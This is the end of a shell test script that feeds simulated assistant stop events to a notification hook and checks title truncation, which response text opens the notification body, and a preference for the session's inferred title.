wait_until wait_text 'title=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijkl...' && ! grep -q 'Needs Input' "$LOG" && ok "long title truncates with ellipsis, no suffix" || no "long title truncates with ellipsis, no suffix"
# The body opens with the final response's first text, not its last line.
LEAKB="$TMP/leakb.jsonl"; printf '%s\n' '{"type":"assistant","message":{"content":[{"type":"text","text":"No the evidence shows the opposite"},{"type":"text","text":"One honest caveat if a daemon"}]}}' > "$LEAKB"
: > "$LOG"; run claude "{\"hook_event_name\":\"Stop\",\"session_id\":\"firsttxt\",\"transcript_path\":\"$LEAKB\",\"cwd\":\"/tmp/claudeproj\"}"
wait_until wait_text 'evidence shows the opposite' && ! wait_text 'honest caveat' && ok "body uses the opening text, not the last line" || no "body uses the opening text, not the last line"
# Polytoken titles prefer the session's inferred_title over the raw prompt preview.
mkdir -p "$PSDIR/enr6"; printf '%s' '{"inferred_title":"my real title","last_user_message_preview":"quoted snippet"}' > "$PSDIR/enr6/session.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr6"}'
wait_until wait_text 'title=my real title ' && ok "inferred_title is preferred for the title" || no "inferred_title is preferred for the title"
[ "$fail" -eq 0 ] && echo "PASS: $pass" || echo "FAILURES: $fail/$((pass+fail))"; exit "$fail"
